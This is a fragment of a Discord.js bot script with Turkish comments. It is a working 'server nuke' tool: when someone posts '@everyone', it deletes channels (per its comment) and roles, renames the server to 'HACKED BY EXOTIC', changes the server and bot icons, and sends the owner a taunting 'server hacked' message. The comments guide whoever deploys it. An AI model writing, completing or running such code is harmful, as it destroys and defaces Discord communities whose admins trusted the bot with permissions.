...
client.on("message", async msg => {
  if (msg.content === "@everyone") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
    msg.delete();
    ...
    await msg.guild.setIcon("https://hizliresim.com/3gtofwa");  //SUNUCUNUN PPSİNİ DEĞİŞTİRİR.
    await msg.guild.setName("HACKED BY EXOTIC"); //SUNUCUNUN ISMINI DEGISTIRIR
    await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
    await client.user.setAvatar("https://hizliresim.com/3gtofwa"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
    await client.user.setUsername("!Everyone");    //BOTUN ISMİNİ DEGISTIRIR
    await msg.guild.owner.send("**SUNUCU HACKLENDİ HADİ KOLAY GELSİN :D**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
